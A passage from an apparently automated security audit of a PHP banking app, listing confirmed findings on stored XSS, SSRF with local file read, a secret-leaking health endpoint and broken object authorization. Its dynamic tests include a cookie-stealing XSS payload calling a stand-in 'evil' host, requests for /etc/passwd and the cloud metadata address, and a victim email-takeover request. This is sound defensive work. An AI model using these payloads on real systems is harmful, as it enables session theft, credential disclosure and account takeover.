IDs, plus learn DB topology. The complete source-to-sink path is: unauthenticated HTTP GET /api/health -> Router::dispatch (no middleware invoked) -> Router::health() -> config/app.php require -> Response::success() -> HTTP response body containing jwt_secret/db credentials. No compensating control (WAF rule, environment gate, feature flag, network ACL) is present in code to block this in production; default fallback secret is even a static/predictable string if env var unset, worsening the risk further.

## 52. Stored XSS via transaction description rendered without escaping in account transaction history

- Lead reference: PWNJ-052
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:164
- Fingerprint: 684397d3f2b3415378fb1ad440036a9a37e4229e369a118aed18c7b51d6f70d8

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/public/banking/js/pages/transfers.js",
  "line": 340,
  "symbol": "desc",
  "input": "transfer-own-desc / transfer-ext-desc form field, sent as description in Api.transferOwn/transferExternal payload"
}
```

#### Controls encountered

```
[
  "Server validates description only as string with max length 255 (Validator::make rule 'string|max:255') — no HTML/script filtering, confirmed in TransactionController.php",
  "Transaction::format() returns description field unmodified with no output encoding, confirmed in Transaction.php format() method",
  "Sibling fields in the same table row (date, type, currency, card numbers) are escaped via U.escapeHtml or rendered as formatted numerics, but tx.description is concatenated raw, confirmed at accounts.js line 164 vs 165/163/168",
  "container.innerHTML = html assignment at accounts.js line 171 is a direct DOM sink for any injected markup"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/accounts.js",
  "line": 171,
  "symbol": "container.innerHTML = html",
  "operation": "HTML injection via unescaped tx.description"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not exhaustively verify there is no global CSP header (e.g. script-src restrictions) set at the web-server/framework bootstrap level that could mitigate script execution impact, though inline event handlers like onerror on an <img> tag typically bypass typical script-src-only CSP unless unsafe-inline is also disallowed and inline handlers are blocked specifically",
  "The cross-account delivery mechanism via transferExternal (attacker sending to a victim's BSB/account) was not independently re-verified in this session beyond what's cited, though it is not required to confirm the core stored-XSS-in-own-history vulnerability which works via transferOwn against the attacker's own viewed account"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker (authenticated) sends external transfer to victim's BSB/account with malicious description",
    "TransactionController::transferExternal validates description only as string|max:255",
    "TransferService::transferExternal resolves to_account via BSB/number (no ownership check on source either) and persists description verbatim",
    "Victim opens account detail page: renderDetailTransactions() concatenates tx.description into innerHTML unescaped",
    "container.innerHTML = html executes injected script in victim's session"
  ],
  "impact": "Stored XSS in account transaction history executing in the recipient's authenticated session, combined with a source-account IDOR, enabling session/token theft and account takeover.",
  "severity_reasoning": "High: attacker-controlled field reaches an unescaped innerHTML sink in a victim's authenticated session purely via normal transfer flow, with token-theft impact.",
  "dynamic_test": "Send a transfer to a victim's BSB/account with description='<img src=x onerror=fetch(`//evil/?c=`+document.cookie)>'; have the victim view GET /api/accounts/{id} transactions and confirm script executes via accounts.js's unescaped description rendering."
}
```

#### Validator reasoning

Verified end-to-end: (1) Server-side validation in TransactionController::transferOwn/transferExternal only applies 'string|max:255' to the description field with no HTML/script filtering (confirmed at TransactionController.php lines 58/88/97). (2) Transaction::create stores the raw description verbatim into the DB (Transaction.php ~line 99), and Transaction::format() returns it unmodified in the API JSON response ('description' => $txn['description'], no htmlspecialchars/strip_tags anywhere in Transaction.php). (3) On the client, accounts.js renderDetailTransactions builds each row via string concatenation and injects tx.description raw: `'<td ...>' + (tx.description || '—') + '</td>'` while every sibling field in the same row (date via U.formatDate, type via U.escapeHtml, amount as numeric+U.formatCurrency, and even the FX info span) is escaped or numeric-only — confirming the omission is a genuine inconsistency, not a false positive from over-eager pattern matching. (4) The resulting html string is assigned via `container.innerHTML = html` (line 171), which is a classic DOM XSS sink that executes injected markup/script in the viewing user's authenticated session. (5) U.escapeHtml is a real, working utility (defined in public/banking/js/utils.js and used pervasively elsewhere), so there is no accidental double-protection anywhere upstream — the description value flows from user input to sink with zero encoding at any layer. The additional cross-account delivery angle (transferExternal creating a shared transaction row visible to both parties, enabling one authenticated user to plant payload into another's view) is corroborated by the IDOR-style resolution via to_bsb/to_account_number in TransferService, though this control mainly affects blast radius/severity rather than being required for the core stored-XSS-in-own-account-history proof, which is exploitable purely via transferOwn's own description field on any account the attacker controls. No CSP, sanitization middleware, or template auto-escaping was found anywhere in the reviewed files that would neutralize this.

## 53. Stored XSS via unescaped transaction description in account transaction list

- Lead reference: PWNJ-053
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:151-171
- Fingerprint: 409b5715607f6ec0f470f2800d9864adc18f3c5acdc2b7b932bf65848e3b875a

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 91,
  "symbol": "transferExternal",
  "input": "description (attacker-controlled JSON body field, validated only as string|max:255)"
}
```

#### Controls encountered

```
[
  "[\"U.escapeHtml() is called for tx.type and other fields in the same row, but is conspicuously absent for tx.description, confirming this is an inconsistent omission rather than a deliberate different handling path\", \"Validator only enforces string|max:255 on description with no HTML/script character filtering\"]\n<parameter name=\"counterevidence\">[]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/accounts.js",
  "line": 171,
  "symbol": "container.innerHTML = html;",
  "operation": "DOM HTML injection"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "No explicit CSP header/meta configuration was reviewed in this session to fully rule out script-execution mitigation, though none was found in the files inspected",
  "DB schema/migration for the transactions table was not directly inspected to confirm no column-level sanitization triggers exist, though TransferService clearly passes the raw string to Transaction::create with no encoding calls"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker sends transfer with malicious description to victim's known BSB/account number",
    "TransactionController::transferExternal validates only length",
    "Transaction stored verbatim, visible to both parties",
    "Victim opens Account Detail page -> renderDetailTransactions()",
    "Unescaped tx.description concatenated into innerHTML at accounts.js:171",
    "Injected script executes, reads localStorage bankofed_token"
  ],
  "impact": "Stored XSS in victim's transaction history leading to theft of the JWT stored in localStorage and full account takeover, requiring no victim interaction beyond normal browsing.",
  "severity_reasoning": "High: same class as PWNJ-052/090-093, direct session-token theft via stored XSS reachable via ordinary transfer.",
  "dynamic_test": "Transfer funds to a victim's account/BSB with description containing an XSS payload targeting localStorage token theft; have victim open Account Detail page and confirm script executes."
}
```

#### Validator reasoning

The full source-to-sink chain is verified in code. Server-side: TransactionController::transferExternal validates `description` only as `string|max:255` (no HTML stripping/encoding), and TransferService::transferExternal stores it verbatim via Transaction::create() without any sanitization. The destination account is resolved purely by BSB/account number lookup (Account::findByBsbAndNumber) with no ownership or relationship requirement — any authenticated user can push a transaction with an attacker-controlled description string to any other user's account. Client-side: renderDetailTransactions() in accounts.js (lines 151-171) builds the transaction table via string concatenation and injects `(tx.description || '—')` directly, without calling U.escapeHtml(), while every other field in the same row (date via U.formatDate, type via U.escapeHtml, amount numeric/currency-formatted) is safely handled. The resulting `html` variable is assigned via `container.innerHTML = html` at line 171, confirmed by direct file read. This is a genuine app-wide inconsistency: U.escapeHtml is used pervasively elsewhere in both the admin and banking JS bundles (utils.js, other pages), confirming this is an omission rather than an intentional different sink. When the victim opens their own Account Detail page and calls loadTransactions() -> renderDetailTransactions(), the injected markup/script executes in the victim's authenticated session context, and since the JWT is stored in localStorage (per api.js reference in the finding, consistent with app architecture), this enables session/token theft. No WAF, CSP, template auto-escaping, or DOMPurify/sanitization layer was found anywhere in the reviewed files that would block this. The proof gaps listed (CSP configuration, DB storage stripping) are minor residual items that do not change the core exploitability — no CSP meta tag or header configuration was found in the reviewed code, and the DB layer stores the string verbatim per Transaction::create with no filtering visible in TransferService.

#### Code evidence

```
txns.forEach(function (tx) {
  ...
  html +=
    '<tr class="tx-row border-b border-slate-50">' +
      '<td class="px-6 py-3.5 text-slate-500 whitespace-nowrap">' + U.formatDate(tx.created_at) + '</td>' +
      '<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>' +   // <-- NOT escaped
      '<td class="px-6 py-3.5"><span class="capitalize text-slate-500">' + U.escapeHtml(tx.type) + '</span></td>' +
      ...
    '</tr>';
});
...
container.innerHTML = html;  // accounts.js:171

// TransactionController.php: 'description' => 'string|max:255'  (no sanitization)
// TransferService.php: Transaction::create(['description' => $description, ...])  (stored verbatim)
```

## 54. Stored XSS via transaction description rendered without HTML-escaping

- Lead reference: PWNJ-054
- Category: A03
- Severity: HIGH
- Confidence: 88%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/dashboard.js:91
- Fingerprint: cd3bb662df1b84ba6e2d63c24d2a06bb38b1666e44203734c12d5556fc2fdf03

### Evidence Chain

#### Source

```
BankOfEd-main/public/banking/js/pages/dashboard.js:91
```

#### Controls encountered

```
[
  "Validator::make enforces only 'string|max:255' on description — no HTML sanitization or output encoding at any layer",
  "Other fields in the same dashboard.js/accounts.js render functions (account_name, bsb, account_number, card fields) are correctly passed through U.escapeHtml, showing escaping is available but omitted specifically for tx.description"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "Transaction::findByUser with accountId=null (the exact query used by dashboard.js's own Api.getTransactions({per_page:10}) call) returns only the viewing user's own transactions today, so from this exact call path the injected HTML is currently limited to self-XSS rather than a stranger's payload appearing on the victim's own dashboard without their own action of creating it."
]
```

#### Proof gaps

```
[
  "Did not execute the app end-to-end (no runtime harness) to observe the DOM actually parsing an injected <script>/<img onerror> payload; conclusion is based on static code-path tracing of description flowing unescaped from input to innerHTML.",
  "Did not enumerate Transaction::findByUser's SQL exactly to confirm the accountId!=null branch's WHERE clause includes to_account_id matches for arbitrary senders (only inferred from account-detail behavior showing incoming/credit transactions with tx.perspective==='credit'), though this is strongly supported by the presence of credit/debit perspective logic in Transaction::format."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker sets transaction description with HTML/script payload via transfer",
    "Transaction stored verbatim (no sanitization)",
    "Victim views dashboard (or account detail using the same backend field)",
    "dashboard.js renderTransactions() inserts (tx.description || tx.type) into innerHTML without escapeHtml",
    "container.innerHTML = html executes injected script in victim's session"
  ],
  "impact": "Unescaped rendering of transaction descriptions on the dashboard constitutes an independent stored-XSS sink; combined with cross-user reachable data (via accounts.js account-scoped queries), it enables script execution in another user's session.",
  "severity_reasoning": "High: unescaped DOM sink for attacker-controlled field, proven cross-user reachable via related account-scoped endpoints.",
  "dynamic_test": "As attacker, create a transaction with a malicious description visible on the dashboard's recent-transactions widget (e.g. via account-scoped queries), then view the dashboard as the affected user and confirm script executes via dashboard.js's unescaped rendering."
}
```

#### Validator reasoning

Verified the full chain. Sink: dashboard.js renderTransactions() builds `html += '...<p ...>' + (tx.description || tx.type) + '</p>...'` for every transaction returned by Api.getTransactions({per_page:10}) and then sets `container.innerHTML = html;` — no call to U.escapeHtml on tx.description, unlike every other dynamic field in the same file (acc.account_name, acc.bsb, acc.account_number all use U.escapeHtml). Source: TransactionController::transferExternal validates description only with 'string|max:255' (no HTML/script filtering), passes it straight to TransferService::transferExternal, which stores it verbatim via Transaction::create and returns it verbatim via Transaction::format (no server-side encoding). Any authenticated user can set an arbitrary description on a transfer to a known BSB/account number (VULNERABILITY #23 also removes source-account ownership checks, but that's a separate issue). Cross-user reachability: confirmed via accounts.js renderDetailTransactions(), which calls Api.getTransactions({account_id: detailAccountId,...}) — a query that, per TransactionController::index/Transaction::findByUser, legitimately returns transactions where the queried account is either the from or to side, i.e. it will include incoming transfers where to_account_id belongs to the viewing victim and description/from_account_id belongs to the attacker. accounts.js renders `'<td>...' + (tx.description || '—') + '</td>'` with the same unescaped pattern. This proves the transactions.description field is genuinely attacker-controlled, cross-user-visible, and rendered without encoding by the identical serialization/rendering pipeline used in dashboard.js. The dashboard.js sink itself is confirmed as an independent unescaped-innerHTML injection point for the same untrusted field; while the specific no-account_id dashboard query is normally self-only today, the sink is real, unescaped, and processes attacker-influenced data returned by the same API/format layer, making it a valid (at minimum self-XSS-capable, and class-confirmed cross-user-capable via the sibling accounts.js path) stored-XSS finding worth fixing at this exact location.

#### Code evidence

```
// dashboard.js
txns.forEach(function (tx) {
  ...
  html +=
    '<div class="tx-row flex items-center gap-4 px-6 py-4">' +
      icon +
      '<div class="flex-1 min-w-0">' +
        '<p class="font-medium text-slate-900 truncate">' + (tx.description || tx.type) + '</p>' +
        ...
});
container.innerHTML = html;

// TransferService::transferExternal — description stored with no sanitization
$txnId = Transaction::create([... 'description' => $description, ...]);

// accounts.js — cross-account reachable sink for the same field
'<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>'
```

## 55. SSRF / local file read via unvalidated avatar import URL

- Lead reference: PWNJ-055
- Category: A10
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:74
- Fingerprint: 2b33ea98edbe24287bbfd98c49afc1821142162b9a1912a86dd1abbd1bb6f634

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:74
```

#### Controls encountered

```
[
  "auth => true middleware (requires a valid authenticated session, but does not restrict target URL or scheme)",
  "5-second timeout on the http stream context (limits but does not prevent local file reads or fast internal scans)"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "The @ suppression on file_get_contents and generic FETCH_FAILED error could make blind exfiltration slightly harder to iterate quickly, but does not block the vulnerability since content is still returned/exposed on success and errors are visible.",
  "No content-length/size cap is enforced, but this is not a mitigating control against the SSRF itself."
]
```

#### Proof gaps

```
[
  "No runtime confirmation that php.ini disables the file:// wrapper or restricts allow_url_include/allow_url_fopen in a way that would block this (default PHP behavior allows file:// unconditionally, but deployment-specific php.ini hardening is not visible in the repo).",
  "No confirmation of container/network egress policy that might limit reachability to cloud metadata endpoints or other internal hosts in the actual deployment environment; however, at minimum local file disclosure via file:// remains viable regardless of network egress controls."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user submits malicious avatar URL (file:// or internal address)",
    "ProfileController::avatarProxy() file_get_contents() with no scheme/host restriction",
    "Server reads local file or internal service",
    "Base64 content returned to client; URL persisted to avatar_url",
    "Repeated automatic replay on every loadAvatar() call"
  ],
  "impact": "Authenticated user can force server-side reads of local files or internal network resources, with persistent replay since the URL is saved and auto-fetched on every profile load.",
  "severity_reasoning": "High: SSRF/LFI with persistent, repeatable exploitation and data exfiltration back to the attacker.",
  "dynamic_test": "POST /api/profile/avatar {\"url\":\"file:///etc/passwd\"} and separately {\"url\":\"http://169.254.169.254/\"}; inspect the returned avatar_data/size fields to confirm file contents or internal service response was fetched and disclosed."
}
```

#### Validator reasoning

The code in ProfileController::avatarProxy (lines 63-107) takes $data['url'] directly from the raw JSON POST body with zero validation (only an empty() check) and passes it straight to file_get_contents($data['url'], false, $context). There is no scheme allow-list (http/https only), no host allow-list, no blocking of loopback/link-local/private IP ranges, and no DNS-rebinding protection. PHP's file_get_contents natively supports the file:// wrapper (unaffected by allow_url_fopen, which only gates http(s) wrappers), so an authenticated user can submit file:///etc/passwd or any local path readable by the web server user and have its contents base64-encoded and returned in the API response (avatar_data), as well as persisted to avatar_url and auto re-fetched on every future profile load (src/Controllers/ProfileController.php:86, invoked from profile.js loadAvatar). Route wiring in src/Router.php:51 confirms POST /api/profile/avatar maps to avatarProxy with only 'auth' => true (any logged-in user, no additional authorization/role check, no CSRF-specific mitigation visible here). This is a directly reachable, unauthenticated-to-role (but any-authenticated-user) source-to-sink path with no effective control in between. The classification as SSRF + local file disclosure is accurate and the severity (high) is appropriate given credential/config file exposure risk and internal network reachability (cloud metadata endpoints, admin-only internal services). The stream_context only sets 'http' timeout/follow_location, which does not restrict scheme and is irrelevant to file:// requests. No allow-list, regex check, parse_url() scheme check, or SSRF-guard library call exists anywhere in this function or its callees.

#### Code evidence

```
// ProfileController::avatarProxy
$content = @file_get_contents($data['url'], false, $context); // no scheme/host validation
...
User::update((int)$auth['user']['id'], ['avatar_url' => $data['url']]);
Response::success(['avatar_data' => "data:{$mime};base64,{$encoded}", 'size' => strlen($content), 'source_url' => $data['url']]);

// profile.js
function loadAvatar(user) {
  if (!user || !user.avatar_url) return;
  Api.importAvatar(user.avatar_url)
    .then(function (res) { renderAvatar(res.data); })
    .catch(function () { /* leave placeholder if the source is unreachable */ });
}
```

## 56. DOM XSS via unescaped avatar source_url / Content-Type header in renderAvatar

- Lead reference: PWNJ-056
- Category: A03
- Severity: MEDIUM
- Confidence: 75%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/profile.js:136
- Fingerprint: bb7cd7275a7552e2067c366804ff7fe412c79b0a50c49b8c42c1730b19c63fa0

### Evidence Chain

#### Source

```
BankOfEd-main/public/banking/js/pages/profile.js:136
```

#### Controls encountered

```
[
  "None effective: server performs no sanitization of Content-Type header or supplied URL before echoing them back; client performs no HTML-encoding before insertion via jQuery .html()",
  "Bearer-token (localStorage) auth model prevents classic cross-site CSRF delivery of the malicious avatar import request, limiting blast radius to self-XSS"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No other code path renders another user's avatar_data/source_url (admin panel and sidebar only render the currently-authenticated user's own cached avatar), so this is confined to a self-XSS rather than a cross-user stored XSS",
  "No CSRF vector exists to force a victim to submit the malicious avatar URL on the attacker's behalf, since auth token is not an ambient credential (cookie) but must be supplied explicitly by client-side JS"
]
```

#### Proof gaps

```
[
  "Not verified whether any deployed reverse-proxy/CDN layer (outside this repo) adds a Content-Security-Policy header that could reduce impact of the injected script",
  "Exploitability in practice still requires the victim to knowingly submit an attacker-supplied avatar URL (social engineering), so real-world exploitation likelihood is lower than a typical reflected/stored XSS against arbitrary victims"
]
```

#### Attack path

```
{
  "nodes": [
    "User submits crafted URL or points import at attacker-controlled server",
    "Server echoes source_url verbatim / builds avatar_data from unsanitized Content-Type header",
    "profile.js renderAvatar() inserts values via jQuery .html() with no escaping",
    "Injected HTML/script executes in user's session on every subsequent profile load (loadAvatar)"
  ],
  "impact": "DOM-based self-XSS via unescaped source_url and Content-Type-derived avatar_data, persistently replayed on every profile page load due to stored avatar_url.",
  "severity_reasoning": "Medium: primarily self-XSS, but persistent/durable due to stored avatar_url auto-replay.",
  "dynamic_test": "Submit an avatar URL containing an HTML injection payload in the query string; confirm $('#avatar-source').html(...) in profile.js renders it unescaped; separately, host a server returning a crafted Content-Type header to break out of the img src attribute and execute script."
}
```

#### Validator reasoning

Verified the full source-to-sink path in the repository.

Sink: profile.js renderAvatar() at lines 136-143 inserts `data.avatar_data` and `data.source_url` into the DOM via jQuery `.html()` with plain string concatenation, no HTML-encoding or use of `.text()`. This is a textbook DOM-XSS sink.

Source: ProfileController::avatarProxy() (src/Controllers/ProfileController.php:63-105) fetches whatever URL the caller supplies (`$data['url']`, only checked for emptiness — no scheme/host allow-list, no SSRF/URL validation), then:
  - builds `avatar_data` as `"data:{$mime};base64,{$encoded}"` where `$mime` is copied verbatim from the fetched response's `Content-Type:` HTTP header (`$mime = trim(substr($header, 13));`) with zero sanitization, and
  - returns `source_url` as the raw, unmodified request value `$data['url']`.
Both values are echoed straight back to the browser and then rendered unescaped by renderAvatar(). Because the attacker controls the server behind the supplied URL, they fully control the `Content-Type` response header value (e.g. `Content-Type: image/png"><script>...</script>`), which breaks out of the `src="..."` attribute built at profile.js:139 and executes arbitrary script in the page. `source_url` itself is likewise a trivial injection vector requiring no external server at all. The `avatar_url` is persisted (`User::update(... ['avatar_url' => $data['url']])`) and automatically re-fetched/re-rendered every time the profile page loads via loadAvatar(), so the payload re-fires on every visit as long as the attacker-controlled server keeps responding with the malicious header.

No mitigating control exists at any layer: no output encoding in JS, no server-side HTML/attribute sanitization of `$mime` or `$data['url']`, and no CSP header is set anywhere in the codebase (grep for Content-Security-Policy returned nothing) that would neutralize inline/injected script execution.

Caveat correctly reflected in confidence/severity: authentication in this app is Bearer-token-in-localStorage (Authorization header), not cookie/session based, so an attacker cannot force this action cross-site via classic CSRF — the victim must supply/import the malicious URL into their own account (self-XSS), and no other code path (admin panel, other users' views) renders another user's avatar_data/source_url, so cross-account propagation is not present. This confirms the "self-XSS" framing in the candidate's own filter_reasoning rather than contradicting the finding: the vulnerable code path and missing-escaping root cause are real and reproducible, they are simply scoped to the acting account rather than being a stored XSS against arbitrary victims.

#### Code evidence

```
function renderAvatar(data) {
  $('#avatar-preview').html(
    '<img src="' + data.avatar_data + '" alt="avatar" class="w-full h-full object-cover">'
  );
  $('#avatar-source')
    .html('Imported ' + data.size + ' bytes from ' + data.source_url)
    .removeClass('hidden');
}
// backend: $mime taken from attacker-controlled server's Content-Type header, no sanitization
if (stripos($header, 'content-type:') === 0) { $mime = trim(substr($header, 13)); break; }
Response::success(['avatar_data' => "data:{$mime};base64,{$encoded}", ... 'source_url' => $data['url']]);
```

## 57. Unauthenticated /api/health endpoint leaks JWT signing secret and DB credentials

- Lead reference: PWNJ-057
- Category: A05
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:22-32 (route registered at line 86, auth=false)
- Fingerprint: 0bf33163ea9f35c33d65895e20420bfc4e3c705e2044cfab5718b639500979f6

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:22-32 (route registered at line 86, auth=false)
```

#### Controls encountered

```
[
  "None: dispatch() only applies AuthMiddleware/MachineAuthMiddleware when route 'auth' is true or 'machine'; health route explicitly sets 'auth' => false so no middleware runs.",
  "No environment gate (e.g. debug-mode check) restricts the leaked fields to non-production."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "None found; the code path is unconditional and matches the described exploit exactly."
]
```

#### Proof gaps

```
[
  "Whether operators override JWT_SECRET/DB_* via environment variables in production is unknown, but this does not block exploitability since the endpoint always returns whatever secret value is actually configured, defeating the purpose of secrecy regardless of whether it's the hardcoded default or a real production secret."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false, route registered at line 86)",
    "Router::health() returns jwt_secret, db_host, db_name, db_user",
    "Attacker forges session token with leaked secret",
    "AuthMiddleware accepts forged token -> full session forgery"
  ],
  "impact": "Unauthenticated JWT secret and DB credential disclosure enabling full session forgery for any user account.",
  "severity_reasoning": "High: duplicate critical unauthenticated secret-exposure finding, direct path to account takeover.",
  "dynamic_test": "curl -s https://target/api/health with no auth; confirm jwt_secret/db_host/db_name/db_user returned; forge JWT with leaked secret and confirm acceptance."
}
```

#### Validator reasoning

Router::health() is registered with auth => false, and Router::dispatch() only invokes AuthMiddleware/MachineAuthMiddleware when the route's 'auth' flag equals true or 'machine'; for any other value (including false) the handler is called directly with no gating at all. The handler unconditionally requires config/app.php and echoes db_host, db_name, db_user, and jwt_secret (plus php_version, server banner, environment) directly in the JSON success response, with no redaction or environment check (e.g., no APP_ENV==='production' guard). config/app.php confirms 'jwt_secret' is populated from JWT_SECRET env var or a hardcoded fallback default. AuthService::issue (JWT::encode) and presumably AuthMiddleware (JWT::decode) use this exact same config['jwt_secret'] to sign/verify user session tokens, so leaking it via /api/health enables full JWT forgery for arbitrary user accounts, plus disclosure of DB host/name/user aiding further attacks. The source-to-sink path is direct and unconditional: HTTP GET /api/health -> Router::dispatch (no middleware executed) -> Router::health() -> Response::success() including secrets in the HTTP response body. No authentication, authorization, environment check, or output filtering blocks this.

#### Code evidence

```
public static function health(): void {
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 58. Broken Object Level Authorization in profile update via attacker-supplied user_id

- Lead reference: PWNJ-058
- Category: API1
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:52 (update)
- Fingerprint: e95a7e8b1f01bacb038b8292675109352cc64864027902c0fdee1952ec756368

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:52 (update)
```

#### Controls encountered

```
[
  "Field name allow-list (array_intersect_key) restricts which columns can be modified, but does not restrict which row (user) is targeted",
  "Input validation (Validator::make) checks format/type of supplied fields but not resource ownership",
  "AuthMiddleware verifies the request bears a valid JWT and resolves the caller's own identity, but this identity is never cross-checked against the attacker-supplied target user_id"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not execute the endpoint end-to-end against a running instance to observe an HTTP response confirming a victim's row was altered; conclusion is based on complete static code-path tracing from route registration through controller logic to the model's parameterized UPDATE statement."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker",
    "PUT /api/profile with user_id field in body",
    "ProfileController::update() targetUserId derived from body, not enforced against $auth['user']['id']",
    "User::update($targetUserId, $updateData) modifies victim's record"
  ],
  "impact": "BOLA allowing any logged-in user to change another customer's email/phone/address, a classic account-hijacking vector.",
  "severity_reasoning": "High: BOLA on a mutation endpoint enabling account-detail hijacking for arbitrary victims.",
  "dynamic_test": "As authenticated user, PUT /api/profile with {\"user_id\": <victim id>, \"email\":\"attacker@evil.com\"}; confirm victim's email is changed."
}
```

#### Validator reasoning

The candidate is fully substantiated by direct code inspection. Router.php registers `PUT /api/profile` with `auth => true`, which only requires a valid authenticated session (AuthMiddleware verifies the JWT and resolves the caller's own user record into $auth['user']) — it performs no per-request ownership/authorization check tied to a specific target resource. In ProfileController::update(), the code computes `$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];` directly from attacker-controlled JSON body, with no validation that $targetUserId equals $user['id'] or that the caller has any relationship/permission over that target. This $targetUserId is passed straight to `User::update($targetUserId, $updateData)`, which builds and executes a parameterized `UPDATE users SET ... WHERE id = ?` using the caller-supplied id. Fields allowed for update (email, phone, address, names) are attacker-controllable via array_intersect_key on the same untrusted body. There is no secondary authorization layer, no role check, no ACL between AuthMiddleware and the User::update call. The only validation performed (Validator::make) checks field formats (string length, email format, enum for state, regex for postcode) but never checks resource ownership. This is a complete, concrete, reachable source (JSON body user_id) to sink (User::update SQL statement) path with no blocking control — a classic BOLA/IDOR (OWASP API1) allowing any authenticated user to modify another user's profile fields (e.g., changing victim's email to takeover the account via password reset, or altering contact/address details).

#### Code evidence

```
$allowed = ['first_name','last_name','email','phone','address_line1','address_line2','suburb','state','postcode'];
$updateData = array_intersect_key($data, array_flip($allowed));

// Allow specifying which profile to update
$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];

if (!empty($updateData)) {
    User::update($targetUserId, $updateData);
}
$updated = User::findById($targetUserId);
Response::success(User::toPublic($updated), 'Profile updated successfully');
```

## 59. SSRF via unrestricted server-side fetch of user-supplied URL in avatar proxy

- Lead reference: PWNJ-059
- Category: A10
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:66-100 (avatarProxy)
- Fingerprint: 3c082a75860dea947c631e966c91b674748d34c462c3177f5de4c54ff2d3613d

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:66-100 (avatarProxy)
```

#### Controls encountered

```
[
  "Requires valid session/JWT auth (auth=>true) to reach the endpoint, which limits the attack to authenticated users but does not prevent SSRF against internal-only infrastructure or cloud metadata endpoints that authenticated app users should not otherwise reach",
  "empty() check only guards against missing/blank URL, provides no scheme/host restriction"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "No confirmation of what internal services/metadata endpoints are actually reachable from the deployment network, but this does not change the code-level vulnerability determination"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker",
    "POST /api/profile/avatar {url:<internal/loopback address or file://>}",
    "ProfileController::avatarProxy() unrestricted file_get_contents()",
    "Server issues request to internal resource",
    "Response content/type returned to attacker"
  ],
  "impact": "Authenticated user can pivot the server into internal network requests, potentially reaching sensitive internal-only services.",
  "severity_reasoning": "High: unrestricted SSRF from an authenticated endpoint enabling internal network access.",
  "dynamic_test": "POST /api/profile/avatar {\"url\":\"http://127.0.0.1:<internal-port>/\"} and inspect the response for evidence the internal service was reached (status/content reflected)."
}
```

#### Validator reasoning

The code at ProfileController::avatarProxy (lines 63-107) reads `url` directly from the JSON request body and passes it unmodified to `file_get_contents($data['url'], false, $context)`. The only check performed is `empty($data['url'])`, which merely rejects blank/absent values; there is no scheme allow-list, no host allow-list, no DNS resolution/IP-range check, and no blocking of the file://, phar://, gopher://, or internal/link-local address space. PHP's file_get_contents with a URL string dispatches through the configured stream wrapper (http, https, ftp, file, etc.), so an attacker-supplied `file:///etc/passwd` or `http://169.254.169.254/latest/meta-data/` (cloud metadata) or an internal RFC1918 address will be fetched server-side. The fetched content is base64-encoded and returned directly in the JSON response (`avatar_data`), along with the guessed mime type, and the raw `source_url` is echoed back and even persisted to the user's `avatar_url` field via `User::update`. The route is registered in Router.php as `POST /api/profile/avatar` with `'auth' => true`, meaning any authenticated user (not just admins) can reach this fully-controlled sink — authentication is not a mitigating control for SSRF against internal services/cloud metadata that trust request origin rather than end-user identity. No SSRF-specific validator, allow-list, or network-layer control was found anywhere in ProfileController.php, Validator.php usage for this endpoint, or Router.php. This is a complete, concrete source (user JSON body `url`) to sink (file_get_contents fetch + response reflection) path with no effective blocking control.

#### Code evidence

```
if (empty($data['url'])) { Response::error('VALIDATION_ERROR', 'Avatar URL is required.', 422); }
